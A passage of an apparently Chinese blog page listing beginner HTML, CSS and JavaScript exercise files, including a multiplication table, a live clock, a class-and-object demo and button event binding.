class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t即使在这么大的资金压力之下，尹志尧并没有害怕，而是选择了找投资方，来加大科研的力度。终于，在尹志尧的坚持下，中微半导体公司成功地研究出了一系列等离子刻蚀设备，并且离建造国际先进水平的半导体产业又更近一步。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t即使在这么大的资金压力之下，尹志尧并没有害怕，而是选择了找投资方，来加大科研的力度。终于，在尹志尧的坚持下，中微半导体公司成功地研究出了一系列等离子刻蚀设备，并且离建造国际先进水平的半导体产业又更近一步。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t但这个时候，美国政府就开始把针对的目光投向了尹志尧的中微半导体公司，还纵容美国各大半导体公司依次对尹志尧的中微半导体公司发起了法律诉讼，想要把中国的半导体产业扼杀在摇篮里。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;foo&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t面对美国政府的限制，尹志尧的中微半导体公司也做好了一切的准备，尹志尧已经在国内外总共申请了1200多项半导体相关的专利，而且大部分是具有创新意识的发明专利，这一举措有效的保护了他们的知识产权，也让美国人意想不到。</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> closeBtn = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;closeBtn&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tcloseBtn.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">var</span> advDiv = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;adv&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tadvDiv.<span class=\"property\">style</span>.<span class=\"property\">display</span> = <span class=\"string\">&#x27;none&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"practise1-html\"><a href=\"#practise1-html\" class=\"headerlink\" title=\"practise1.html\"></a>practise1.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-class\">.a1</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* margin-left: 10px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding-left</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">10px</span> auto;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> c = <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">while</span> (c &lt;= <span class=\"number\">9</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t    <span class=\"keyword\">var</span> d = <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t    <span class=\"keyword\">while</span> (d &lt;= c) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t        <span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`&lt;p class=&#x27;a1&#x27;&gt;<span class=\"subst\">$&#123;c&#125;</span>x<span class=\"subst\">$&#123;d&#125;</span>=<span class=\"subst\">$&#123;c * d&#125;</span>&lt;/p&gt;`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t        d += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(<span class=\"string\">`&lt;p&gt;</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"language-javascript\">\t\t\t\t&lt;/p&gt;`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tc += <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"修改标签内容-周期性执行函数-html\"><a href=\"#修改标签内容-周期性执行函数-html\" class=\"headerlink\" title=\"修改标签内容+周期性执行函数.html\"></a>修改标签内容+周期性执行函数.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#clock</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">position</span>: absolute;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">right</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">top</span>: <span class=\"number\">10px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">240px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: blue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;clock&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> clockDiv = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;clock&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> weekdays = [<span class=\"string\">&#x27;日&#x27;</span>, <span class=\"string\">&#x27;一&#x27;</span>, <span class=\"string\">&#x27;二&#x27;</span>, <span class=\"string\">&#x27;三&#x27;</span>, <span class=\"string\">&#x27;四&#x27;</span>, <span class=\"string\">&#x27;五&#x27;</span>, <span class=\"string\">&#x27;六&#x27;</span>]</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">showClock</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> now = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> year = now.<span class=\"title function_\">getFullYear</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> month = now.<span class=\"title function_\">getMonth</span>() + <span class=\"number\">1</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> date = now.<span class=\"title function_\">getDate</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> hour = now.<span class=\"title function_\">getHours</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> min = now.<span class=\"title function_\">getMinutes</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> sec = now.<span class=\"title function_\">getSeconds</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> day = now.<span class=\"title function_\">getDay</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> fullStr = <span class=\"string\">`<span class=\"subst\">$&#123;year&#125;</span>年<span class=\"subst\">$&#123;month&#125;</span>月<span class=\"subst\">$&#123;date&#125;</span>日 <span class=\"subst\">$&#123;hour&#125;</span>:<span class=\"subst\">$&#123;min&#125;</span>:<span class=\"subst\">$&#123;sec&#125;</span> 星期<span class=\"subst\">$&#123;weekdays[day]&#125;</span>`</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// alert(fullStr)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tclockDiv.<span class=\"property\">textContent</span> = fullStr <span class=\"comment\">//修改文本内容</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"title function_\">showClock</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"variable language_\">window</span>.<span class=\"built_in\">setInterval</span>(showClock, <span class=\"number\">1000</span>) <span class=\"comment\">// 计时器，每间隔一秒执行一次</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"定义类-创建对象-html\"><a href=\"#定义类-创建对象-html\" class=\"headerlink\" title=\"定义类+创建对象.html\"></a>定义类+创建对象.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">constructor</span>(<span class=\"params\">name, age</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t    <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t    <span class=\"variable language_\">this</span>.<span class=\"property\">age</span> = age</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">eat</span>(<span class=\"params\">food</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"title function_\">alert</span>(<span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.name&#125;</span>正在吃<span class=\"subst\">$&#123;food&#125;</span>`</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">watchAv</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">age</span> &lt; <span class=\"number\">18</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"title function_\">alert</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span> + <span class=\"string\">&#x27;只能看《熊出没》&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\t<span class=\"title function_\">alert</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">name</span> + <span class=\"string\">&#x27;少儿不宜&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 构造器函数</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">/*</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tfunction Person(name, age) &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\tthis.name = name</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\tthis.age = age</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tPerson.prototype.eat = function(food) &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\talert(this.name + &#x27;正在吃&#x27; + food)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tPerson.prototype.watchAv = function() &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\tif (this.age &lt; 18) &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\talert(this.name + &#x27;只能看《熊出没》&#x27;)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t&#125; else &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\talert(this.name + &#x27;少儿不宜&#x27;)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t*/</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t   </span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">let</span> person = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;luo&#x27;</span>, <span class=\"number\">39</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tperson.<span class=\"title function_\">eat</span>(<span class=\"string\">&#x27;蛋炒饭&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">let</span> person2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;chui&#x27;</span>, <span class=\"number\">15</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tperson2.<span class=\"title function_\">watchAv</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// JSON - JavaScript Object Notation</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// JavaScript对象表达式 - 创建对象的字面量语法</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">/*</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tconst person = &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\tname: &#x27;luo&#x27;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\tage: 39,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\teat: function(food) &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\talert(this.name + &#x27;正在吃&#x27; + food)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t&#125;,</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\twatchAv: function() &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\tif (this.age &lt; 18) &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\t\talert(this.name + &#x27;只能看《熊出没》&#x27;)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\t&#125; else &#123;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\t\talert(this.name + &#x27;少儿不宜&#x27;)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t&#125;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t// person.age = 15</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tperson.eat(&#x27;蛋炒饭&#x27;)</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\tperson.watchAv()</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"language-javascript\">\t\t\t*/</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"通过循环为多个元素绑定事件回调函数-html\"><a href=\"#通过循环为多个元素绑定事件回调函数-html\" class=\"headerlink\" title=\"通过循环为多个元素绑定事件回调函数.html\"></a>通过循环为多个元素绑定事件回调函数.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>给多个元素绑定事件<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#buttons</span>&gt;<span class=\"selector-tag\">button</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">display</span>: inline-block;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font</span>: <span class=\"number\">22px</span>/<span class=\"number\">40px</span> Arial;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: red;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;buttons&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>苹果<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>香蕉<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>草莓<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>蓝莓<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>榴莲<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>西瓜<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>芒果<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;checkbox&quot;</span> <span class=\"attr\">disabled</span>&gt;</span>柠檬<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> allButtons = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;#buttons&gt;button&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tallButtons.<span class=\"title function_\">forEach</span>(<span class=\"function\"><span class=\"params\">button</span> =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tbutton.<span class=\"title function_\">addEventListener</span>(<span 